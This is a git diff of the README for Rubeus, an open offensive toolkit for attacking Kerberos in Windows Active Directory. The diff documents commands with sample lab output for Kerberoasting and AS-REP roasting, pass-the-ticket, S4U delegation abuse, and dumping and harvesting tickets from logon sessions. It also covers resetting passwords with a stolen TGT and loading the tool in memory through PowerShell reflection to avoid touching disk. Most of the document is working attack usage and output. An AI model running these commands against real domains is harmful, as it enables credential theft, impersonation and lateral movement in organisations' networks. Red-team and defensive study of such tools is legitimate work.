@@ -15,66 +15,96 @@ Rubeus is licensed under the BSD 3-Clause license.
 
 ## Usage
 
-  Rubeus usage:
+    Ticket requests and renewals:
 
-    Retrieve a TGT based on a user hash, optionally applying to the current logon session or a specific LUID:
-        Rubeus.exe asktgt /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid]
+        Retrieve a TGT based on a user password/hash, optionally applying to the current logon session or a specific LUID:
+            Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:RC4|AES256] | /rc4:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid]
 
-    Retrieve a TGT based on a user hash, start a /netonly process, and to apply the ticket to the new process/logon session:
-        Rubeus.exe asktgt /user:USER </rc4:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER]
+        Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:
+            Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:RC4|AES256] |/rc4:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER]
 
-    Renew a TGT, optionally appling the ticket or auto-renewing the ticket up to its renew-till limit:
-        Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/ptt] [/autorenew]
+        Retrieve a service ticket for one or more SPNs, optionally applying the ticket:
+            Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/dc:DOMAIN_CONTROLLER] [/ptt]
 
-    Retrieve a service ticket for one or more SPNs, optionally applying the ticket:
-        Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/dc:DOMAIN_CONTROLLER] [/ptt]
-
-    Perform S4U constrained delegation abuse:
-        Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> /impersonateuser:USER /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/ptt]
-        Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] /impersonateuser:USER /msdsspn:SERVICE/SERVER [/altservice:cifs,HOST,...] [/dc:DOMAIN_CONTROLLER] [/ptt]
-
-    Submit a TGT, optionally targeting a specific LUID (if elevated):
-        Rubeus.exe ptt </ticket:BASE64 | /ticket:FILE.KIRBI> [/luid:LOGINID]
-
-    Purge tickets from the current logon session, optionally targeting a specific LUID (if elevated):
-        Rubeus.exe purge [/luid:LOGINID]
-
-    Parse and describe a ticket (service ticket or TGT):
-        Rubeus.exe describe </ticket:BASE64 | /ticket:FILE.KIRBI>
-
-    Create a hidden program (unless /show is passed) with random /netonly credentials, displaying the PID and LUID:
-        Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" [/show]
-
-    Perform Kerberoasting:
-        Rubeus.exe kerberoast [/spn:"blah/blah"] [/user:USER] [/ou:"OU,..."]
-
-    Perform Kerberoasting with alternate credentials:
-        Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:"blah/blah"] [/user:USER] [/ou:"OU,..."]
-
-    Perform AS-REP "roasting" for users without preauth:
-        Rubeus.exe asreproast /user:USER [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER]
-
-    Dump all current ticket data (if elevated, dump for all users), optionally targeting a specific service/LUID:
-        Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID]
-
-    Retrieve a usable TGT .kirbi for the current user (w/ session key) without elevation by abusing the Kerberos GSS-API, faking delegation:
-        Rubeus.exe tgtdeleg [/target:SPN]
-
-    Monitor every SECONDS (default 60 seconds) for 4624 logon events and dump any TGT data for new logon sessions:
-        Rubeus.exe monitor [/interval:SECONDS] [/filteruser:USER]
-
-    Monitor every MINUTES (default 60 minutes) for 4624 logon events, dump any new TGT data, and auto-renew TGTs that are about to expire:
-        Rubeus.exe harvest [/interval:MINUTES]
+        Renew a TGT, optionally applying the ticket or auto-renewing the ticket up to its renew-till limit:
+            Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/ptt] [/autorenew]
 
 
-  NOTE: Base64 ticket blobs can be decoded with :
+    Constrained delegation abuse:
 
-      [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("aa..."))
+        Perform S4U constrained delegation abuse:
+            Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/ptt]
+            Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/ptt]
+
+
+    Ticket management:
+
+        Submit a TGT, optionally targeting a specific LUID (if elevated):
+            Rubeus.exe ptt </ticket:BASE64 | /ticket:FILE.KIRBI> [/luid:LOGINID]
+
+        Purge tickets from the current logon session, optionally targeting a specific LUID (if elevated):
+            Rubeus.exe purge [/luid:LOGINID]
+
+        Parse and describe a ticket (service ticket or TGT):
+            Rubeus.exe describe </ticket:BASE64 | /ticket:FILE.KIRBI>
+
+
+    Ticket extraction and harvesting:
+
+        List all current tickets (if elevated, list for all users), optionally targeting a specific LUID:
+            Rubeus.exe klist [/luid:LOGINID]
+
+        Dump all current ticket data (if elevated, dump for all users), optionally targeting a specific service/LUID:
+            Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID]
+
+        Retrieve a usable TGT .kirbi for the current user (w/ session key) without elevation by abusing the Kerberos GSS-API, faking delegation:
+            Rubeus.exe tgtdeleg [/target:SPN]
+
+        Monitor every SECONDS (default 60) for 4624 logon events and dump any TGT data for new logon sessions:
+            Rubeus.exe monitor [/interval:SECONDS] [/filteruser:USER] [/registry:SOFTWARENAME]
+
+        Monitor every MINUTES (default 60) for 4624 logon events, dump any new TGT data, and auto-renew TGTs that are about to expire:
+            Rubeus.exe harvest [/interval:MINUTES] [/registry:SOFTWARENAME]
+
+
+    Roasting:
+
+        Perform Kerberoasting:
+            Rubeus.exe kerberoast [/spn:"blah/blah"] [/user:USER] [/ou:"OU,..."]
+
+        Perform Kerberoasting, outputting hashes to a file:
+            Rubeus.exe kerberoast /outfile:hashes.txt [/spn:"blah/blah"] [/user:USER] [/ou:"OU,..."]
+
+        Perform Kerberoasting with alternate credentials:
+            Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:"blah/blah"] [/user:USER] [/ou:"OU,..."]
+
+        Perform AS-REP "roasting" for any users without preauth:
+            Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU,..."]
+
+        Perform AS-REP "roasting" for any users without preauth, outputting hashes to a file:
+            Rubeus.exe asreproast /outfile:hashes.txt [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU,..."]
+
+        Perform AS-REP "roasting" for any users without preauth using alternate credentials:
+            Rubeus.exe asreproast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU,..."]
+
+
+    Miscellaneous:
+
+        Create a hidden program (unless /show is passed) with random /netonly credentials, displaying the PID and LUID:
+            Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" [/show]
+
+        Reset a user's password from a supplied TGT (AoratoPw):
+            Rubeus.exe changepw </ticket:BASE64 | /ticket:FILE.KIRBI> /new:PASSWORD [/dc:DOMAIN_CONTROLLER]
+
+
+    NOTE: Base64 ticket blobs can be decoded with :
+
+        [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("aa..."))
 
 
 ## asktgt
 
-The **asktgt** action will build raw AS-REQ (TGT request) traffic for the specified user and encryption key (/rc4 or /aes256). If no /domain is specified, the computer's current domain is extracted, and if no /dc is specified the same is done for the system's current domain controller. If authentication is successful, the resulting AS-REP is parsed and the KRB-CRED (a .kirbi, which includes the user's TGT) is output as a base64 blob. The /ptt flag will "pass-the-ticket" and apply the resulting Kerberos credential to the current logon session. The /luid:X flag will apply the ticket to the specified logon session ID (elevation needed).
+The **asktgt** action will build raw AS-REQ (TGT request) traffic for the specified user and encryption key (/rc4 or /aes256). A /password flag can also be used instead of a hash. If no /domain is specified, the computer's current domain is extracted, and if no /dc is specified the same is done for the system's current domain controller. If authentication is successful, the resulting AS-REP is parsed and the KRB-CRED (a .kirbi, which includes the user's TGT) is output as a base64 blob. The /ptt flag will "pass-the-ticket" and apply the resulting Kerberos credential to the current logon session. The /luid:X flag will apply the ticket to the specified logon session ID (elevation needed).
 
 Note that no elevated privileges are needed on the host to request TGTs or apply them to the **current** logon session, just the correct hash for the target user. Also, another opsec note: only one TGT can be applied at a time to the current logon session, so the previous TGT is wiped when the new ticket is applied when using the /ptt option. A workaround is to use the **/createnetonly:X** parameter, or request the ticket and apply it to another logon session with **ptt /luid:X**.
 
@@ -145,77 +175,6 @@ Note that no elevated privileges are needed on the host to request TGTs or apply
     [+] Ticket successfully imported!
 
 **Note that the /luid and /createnetonly parameters require elevation!**
-
-
-## renew
-
-The **renew** action will build/parse a raw TGS-REQ/TGS-REP TGT renewal exchange using the specified /ticket:X supplied. This value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk. If a /dc is not specified, the computer's current domain controller is extracted and used as the destination for the renewal traffic. The /ptt flag will "pass-the-ticket" and apply the resulting Kerberos credential to the current logon session.
-
-Note that TGTs MUST be renewed before their EndTime, within the RenewTill window.
-
-    c:\Rubeus>Rubeus.exe renew /ticket:doIFmjCC...(snip)...
-
-     ______        _
-    (_____ \      | |
-     _____) )_   _| |__  _____ _   _  ___
-    |  __  /| | | |  _ \| ___ | | | |/___)
-    | |  \ \| |_| | |_) ) ____| |_| |___ |
-    |_|   |_|____/|____/|_____)____/(___/
-
-    v1.0.0
-
-    [*] Action: Renew TGT
-
-    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
-    [*] Building TGS-REQ renewal for: 'TESTLAB.LOCAL\dfm.a'
-    [*] Connecting to 192.168.52.100:88
-    [*] Sent 1500 bytes
-    [*] Received 1510 bytes
-    [+] TGT renewal request successful!
-    [*] base64(ticket.kirbi):
-
-        doIFmjCCBZagAwIBBaEDAgEWooIErzCCBKthggSnMIIEo6ADAgEFoQ8bDVRFU1RMQUIuTE9DQUyiIjAg
-        ...(snip)...
-
-The **/autorenew** flag will take an existing /ticket .kirbi file, sleep until endTime-30 minutes, auto-renew the ticket and display the refreshed ticket blob. It will continue this renewal process until the allowable renew-till renewal window passes.
-
-C:\Rubeus>Rubeus.exe renew /ticket:doIFFj...(snip)... /autorenew
-
-       ______        _
-      (_____ \      | |
-       _____) )_   _| |__  _____ _   _  ___
-      |  __  /| | | |  _ \| ___ | | | |/___)
-      | |  \ \| |_| | |_) ) ____| |_| |___ |
-      |_|   |_|____/|____/|_____)____/(___/
-
-      v1.0.0
-
-    [*] Action: Auto-Renew TGT
-
-
-    [*] User       : harmj0y@TESTLAB.LOCAL
-    [*] endtime    : 9/24/2018 3:34:05 AM
-    [*] renew-till : 9/30/2018 10:34:05 PM
-    [*] Sleeping for 165 minutes (endTime-30) before the next renewal
-    [*] Renewing TGT for harmj0y@TESTLAB.LOCAL
-
-    [*] Action: Renew TGT
-
-    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
-    [*] Building TGS-REQ renewal for: 'TESTLAB.LOCAL\harmj0y'
-    [*] Connecting to 192.168.52.100:88
-    [*] Sent 1370 bytes
-    [*] Received 1378 bytes
-    [+] TGT renewal request successful!
-    [*] base64(ticket.kirbi):
-
-          doIFFjCCBRKg...(snip)...
-
-
-    [*] User       : harmj0y@TESTLAB.LOCAL
-    [*] endtime    : 9/24/2018 8:03:55 AM
-    [*] renew-till : 9/30/2018 10:34:05 PM
-    [*] Sleeping for 269 minutes (endTime-30) before the next renewal
 
 
 ## asktgs
@@ -315,6 +274,107 @@ The **asktgs** action will build/parse a raw TGS-REQ/TGS-REP service ticket requ
             Session Key Type: AES-128-CTS-HMAC-SHA1-96
             Cache Flags: 0
             Kdc Called:
+
+
+## renew
+
+The **renew** action will build/parse a raw TGS-REQ/TGS-REP TGT renewal exchange using the specified /ticket:X supplied. This value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk. If a /dc is not specified, the computer's current domain controller is extracted and used as the destination for the renewal traffic. The /ptt flag will "pass-the-ticket" and apply the resulting Kerberos credential to the current logon session.
+
+Note that TGTs MUST be renewed before their EndTime, within the RenewTill window.
+
+    c:\Rubeus>Rubeus.exe renew /ticket:doIFmjCC...(snip)...
+
+     ______        _
+    (_____ \      | |
+     _____) )_   _| |__  _____ _   _  ___
+    |  __  /| | | |  _ \| ___ | | | |/___)
+    | |  \ \| |_| | |_) ) ____| |_| |___ |
+    |_|   |_|____/|____/|_____)____/(___/
+
+    v1.0.0
+
+    [*] Action: Renew TGT
+
+    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+    [*] Building TGS-REQ renewal for: 'TESTLAB.LOCAL\dfm.a'
+    [*] Connecting to 192.168.52.100:88
+    [*] Sent 1500 bytes
+    [*] Received 1510 bytes
+    [+] TGT renewal request successful!
+    [*] base64(ticket.kirbi):
+
+        doIFmjCCBZagAwIBBaEDAgEWooIErzCCBKthggSnMIIEo6ADAgEFoQ8bDVRFU1RMQUIuTE9DQUyiIjAg
+        ...(snip)...
+
+The **/autorenew** flag will take an existing /ticket .kirbi file, sleep until endTime-30 minutes, auto-renew the ticket and display the refreshed ticket blob. It will continue this renewal process until the allowable renew-till renewal window passes.
+
+    C:\Rubeus>Rubeus.exe renew /ticket:doIFFj...(snip)... /autorenew
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v1.0.0
+
+    [*] Action: Auto-Renew TGT
+
+
+    [*] User       : harmj0y@TESTLAB.LOCAL
+    [*] endtime    : 9/24/2018 3:34:05 AM
+    [*] renew-till : 9/30/2018 10:34:05 PM
+    [*] Sleeping for 165 minutes (endTime-30) before the next renewal
+    [*] Renewing TGT for harmj0y@TESTLAB.LOCAL
+
+    [*] Action: Renew TGT
+
+    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+    [*] Building TGS-REQ renewal for: 'TESTLAB.LOCAL\harmj0y'
+    [*] Connecting to 192.168.52.100:88
+    [*] Sent 1370 bytes
+    [*] Received 1378 bytes
+    [+] TGT renewal request successful!
+    [*] base64(ticket.kirbi):
+
+          doIFFjCCBRKg...(snip)...
+
+
+    [*] User       : harmj0y@TESTLAB.LOCAL
+    [*] endtime    : 9/24/2018 8:03:55 AM
+    [*] renew-till : 9/30/2018 10:34:05 PM
+    [*] Sleeping for 269 minutes (endTime-30) before the next renewal
+
+
+## changepw
+
+The **changepw** action will take a user's TGT .kirbi blog and execute a MS kpasswd password change with the specified /new:X value. If a /dc is not specified, the computer's current domain controller is extracted and used as the destination for the password reset traffic. This is the Aorato Kerberos password reset disclosed in 2014, and is equivalent to Kekeo's misc::changepw function.
+
+    C:\Temp\tickets>Rubeus.exe changepw /ticket:doIFFjCCBRKgA...(snip)...== /new:Password123!
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v1.2.0
+
+    [*] Action: Reset User Password (AoratoPw)
+
+    [*] Changing password for user: harmj0y@TESTLAB.LOCAL
+    [*] New password value: Password123!
+    [*] Building AP-REQ for the MS Kpassword request
+    [*] Building Authenticator with encryption key type: rc4_hmac
+    [*] base64(session subkey): nX2FOQ3RsGxoI8uqIg1zlg==
+    [*] Building the KRV-PRIV structure
+    [*] Connecting to 192.168.52.100:464
+    [*] Sent 1347 bytes
+    [*] Received 167 bytes
+    [+] Password change success!
+
 
 ## s4u
 
@@ -578,6 +638,8 @@ The **kerberoast** action replaces the [SharpRoast](https://github.com/GhostPack
 
 With no other arguments, all user accounts with SPNs set in the current domain are kerberoasted. The /spn:X argument roasts just the specified SPN, the /user:X argument roasts just the specified user, and the /ou:X argument roasts just users in the specific OU.
 
+The /outfile:FILE argument outputs roasted hashes to the specified file, one per line.
+
 Also, if you wanted to use alternate domain credentials for kerberoasting, that can be specified with /creduserDOMAIN.FQDN\USER /credpassword:PASSWORD.
 
     c:\Rubeus>Rubeus.exe kerberoast /ou:OU=TestingOU,DC=testlab,DC=local
@@ -598,12 +660,47 @@ Also, if you wanted to use alternate domain credentials for kerberoasting, that 
     [*] ServicePrincipalName   : service/host
     [*] Hash                   : $krb5tgs$5$*$testlab.local$service/host*$95160F02CA8EB...(snip)...
 
+    ...(snip)...
+
+
+    C:\Rubeus>Rubeus.exe kerberoast /outfile:hashes.txt
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v1.3.2
+
+    [*] Action: Kerberoasting
+
+    [*] SamAccountName         : harmj0y
+    [*] DistinguishedName      : CN=harmj0y,CN=Users,DC=testlab,DC=local
+    [*] ServicePrincipalName   : asdf/asdfasdf
+    [*] Hash written to C:\Temp\hashes.txt
+
+
+    [*] SamAccountName         : sqlservice
+    [*] DistinguishedName      : CN=SQL,CN=Users,DC=testlab,DC=local
+    [*] ServicePrincipalName   : MSSQLSvc/SQL.testlab.local
+    [*] Hash written to C:\Temp\hashes.txt
+
+    ...(snip)...
+
 
 ## asreproast
 
 The **asreproast** action replaces the [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast/) project which executed similar actions with the (larger sized) [BouncyCastle](https://www.bouncycastle.org/) library. If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline a la kerberoasting.
 
-The /user:X parameter is required, while the /domain and /dc arguments are optional, pulling system defaults as other actions do. The [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast/) project has a JohnTheRipper compatible cracking module for this hash type.
+With no other arguments, all user accounts with Kerberos preauth not required are roasted. The /user:X argument roasts just the specified user, and the /ou:X argument roasts just users in the specific OU. The /domain and /dc arguments are optional, pulling system defaults as other actions do.
+
+The /outfile:FILE argument outputs roasted hashes to the specified file, one per line.
+
+Also, if you wanted to use alternate domain credentials for roasting, that can be specified with /creduserDOMAIN.FQDN\USER /credpassword:PASSWORD.
+
+The output format is John the Ripper ([Jumbo version](https://github.com/magnumripper/JohnTheRipper)) compatible, with Hashcat support coming soon.
 
     c:\Rubeus>Rubeus.exe asreproast /user:dfm.a
 
@@ -629,9 +726,45 @@ The /user:X parameter is required, while the /domain and /dc arguments are optio
           $krb5asrep$dfm.a@testlab.local:F7310EA341128...(snip)...
 
 
+    C:\Rubeus>Rubeus.exe asreproast
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v1.3.2
+
+    [*] Action: AS-REP roasting
+
+    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+    [*] Building AS-REQ (w/o preauth) for: 'testlab.local\dfm.a'
+    [*] Connecting to 192.168.52.100:88
+    [*] Sent 163 bytes
+    [*] Received 1537 bytes
+    [+] AS-REQ w/o preauth successful!
+    [*] AS-REP hash:
+
+        $krb5asrep$dfm.a@testlab.local:F5432...(snip)...
+
+    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+    [*] Building AS-REQ (w/o preauth) for: 'testlab.local\TestOU3user'
+    [*] Connecting to 192.168.52.100:88
+    [*] Sent 169 bytes
+    [*] Received 1437 bytes
+    [+] AS-REQ w/o preauth successful!
+    [*] AS-REP hash:
+
+        $krb5asrep$TestOU3user@testlab.local:6AC7726...(snip)...
+
+    ...(snip)...
+
+
 ## dump
 
-The **dump** action will extract current TGTs and service tickets from memory, if in an elevated context. The resulting extracted tickets can be filtered by /service (use /service:krbtgt for TGTs) and/or logon ID (the /luid:X parameter). The KRB-CRED files (.kirbis) are output as base64 blobs and can be reused with the ptt function, or Mimikatz's **kerberos::ptt** functionality.
+The **dump** action will extract current TGTs and service tickets from memory, if in an elevated context. If not elevated, tickets for the current user are extracted. The resulting extracted tickets can be filtered by /service (use /service:krbtgt for TGTs) and/or logon ID (the /luid:X parameter). The KRB-CRED files (.kirbis) are output as base64 blobs and can be reused with the ptt function, or Mimikatz's **kerberos::ptt** functionality.
 
     c:\Temp\tickets>Rubeus.exe dump /service:krbtgt /luid:366300
 
@@ -690,6 +823,47 @@ The **dump** action will extract current TGTs and service tickets from memory, i
 **Note that this action needs to be run from an elevated context to extract usable TGTs!**
 
 
+## klist
+
+The **klist** action will list current logon sessions and associated ticket information, if in an elevated context. If not elevated, information on the current user's tickets is displayed.
+
+    C:\Temp>Rubeus.exe klist
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v1.3.0
+
+
+
+    [*] Action: List Kerberos Tickets (All Users)
+
+
+    UserName                 : dfm.a
+    Domain                   : TESTLAB
+    LogonId                  : 1915357
+    UserSID                  : S-1-5-21-883232822-274137685-4173207997-1110
+    AuthenticationPackage    : Kerberos
+    LogonType                : Interactive
+    LogonTime                : 2/5/2019 8:05:32 PM
+    LogonServer              : PRIMARY
+    LogonServerDNSDomain     : TESTLAB.LOCAL
+    UserPrincipalName        : dfm.a@testlab.local
+
+        [0] - 0x12 - aes256_cts_hmac_sha1
+        Start/End/MaxRenew: 2/5/2019 12:05:32 PM ; 2/5/2019 5:05:32 PM ; 2/12/2019 12:05:32 PM
+        Server Name       : krbtgt/TESTLAB.LOCAL @ TESTLAB.LOCAL
+        Client Name       : dfm.a @ TESTLAB.LOCAL
+        Flags             : name_canonicalize, initial, renewable, forwardable (40c10000)
+
+
+        ...(snip)...
+
+
 ## tgtdeleg
 
 The **tgtdeleg** using [@gentilkiwi](https://twitter.com/gentilkiwi)'s [Kekeo](https://github.com/gentilkiwi/kekeo/) trick (**tgt::deleg**) that abuses the Kerberos GSS-API to retrieve a usable TGT for the current user without needing elevation on the host. AcquireCredentialsHandle() is used to get a handle to the current user's Kerberos security credentials, and InitializeSecurityContext() with the ISC_REQ_DELEGATE flag and a target SPN of HOST/DC.domain.com to prepare a fake delegate context to send to the DC. This results in an AP-REQ in the GSS-API output that contains a KRB_CRED in the authenticator checksum. The service ticket session key is extracted from the local Kerberos cache and is used to decrypt the KRB_CRED in the authenticator, resulting in a usable TGT .kirbi.
@@ -726,6 +900,8 @@ The **tgtdeleg** using [@gentilkiwi](https://twitter.com/gentilkiwi)'s [Kekeo](h
 The **monitor** action will monitor the event log for 4624 logon events and will extract any new TGT tickets for the new logon IDs (LUIDs). The /interval parameter (in seconds, default of 60) specifies how often to check the event log. A /filteruser:X can be specified, returning only ticket data for said user. This function is especially useful on servers with unconstrained delegation enabled ;)
 
 When the /filteruser (or if not specified, any user) creates a new 4624 logon event, any extracted TGT KRB-CRED data is output.
+
+Further, if you wish to save the output to the registry, pass the /registry flag and specfiy a path under HKLM to create (i.e., `/registry:SOFTWARE\MONITOR`). Then you can remove this entry after you've finished running Rubeus by `Get-Item HKLM:\SOFTWARE\MONITOR\ | Remove-Item -Recurse -Force`.
 
     c:\Rubeus>Rubeus.exe monitor /filteruser:dfm.a
 
@@ -789,6 +965,8 @@ The **harvest** action takes monitor one step further. It monitors the event log
 
 This allows you to harvest usable TGTs from a system without opening up a read handle to LSASS, though elevated rights are needed to extract the tickets.
 
+Further, you can pass the /registry flag to save the tickets into the registry for later extraction, such as `/registry:SOFTWARE\HARVEST`. You can remove the registry save data by `Get-Item HKLM:\SOFTWARE\HARVEST\ | Remove-Item -Recurse -Force`.
+
     c:\Rubeus>Rubeus.exe harvest /interval:30
 
        ______        _
@@ -830,3 +1008,40 @@ This allows you to harvest usable TGTs from a system without opening up a read h
 We are not planning on releasing binaries for Rubeus, so you will have to compile yourself :)
 
 Rubeus has been built against .NET 3.5 and is compatible with [Visual Studio 2015 Community Edition](https://go.microsoft.com/fwlink/?LinkId=532606&clcid=0x409). Simply open up the project .sln, choose "release", and build.
+
+
+### Sidenote: Building Rubeus as a Library
+
+To build Rubeus as a library, under **Project** -> **Rubeus Properties** -> change **Output type** to **Class Library**. Compile, and add the Rubeus.dll as a reference to whatever project you want. Rubeus functionality can then be invoked as in a number of ways:
+
+
+    // pass the Main method the arguments you want
+    Rubeus.Program.Main("dump /luid:3050142".Split());
+
+    // or invoke specific functionality manually
+    Rubeus.LSA.ListKerberosTicketDataAllUsers(new Rubeus.Interop.LUID());
+
+
+You can then use [ILMerge](https://www.microsoft.com/en-us/download/details.aspx?displaylang=en&id=17630) to merge the Rubeus.dll into your resulting project assembly for a single, self-contained file.
+
+
+### Sidenote: Running Rubeus Through PowerShell
+
+If you want to run Rubeus in-memory through a PowerShell wrapper, first compile the Rubeus and base64-encode the resulting assembly:
+
+    [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\Rubeus.exe")) | Out-File -Encoding ASCII C:\Temp\rubeus.txt
+
+Rubeus can then be loaded in a PowerShell script with the following (where "aa..." is replaced with the base64-encoded Rubeus assembly string):
+
+    $RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String("aa..."))
+
+The Main() method and any arguments can then be invoked as follows:
+
+    [Rubeus.Program]::Main("dump /luid:3050142".Split())
+
+Or individual functions can be invoked:
+
+    $KerbTicket = 'do...' # base64-encoded ticket.kirbi
+    $TicketBytes = [convert]::FromBase64String($KerbTicket)
+    $LogonID = [Rubeus.LSA]::CreateProcessNetOnly("mmc.exe", $false)
+    [Rubeus.LSA]::ImportTicket($TicketBytes, $LogonID)
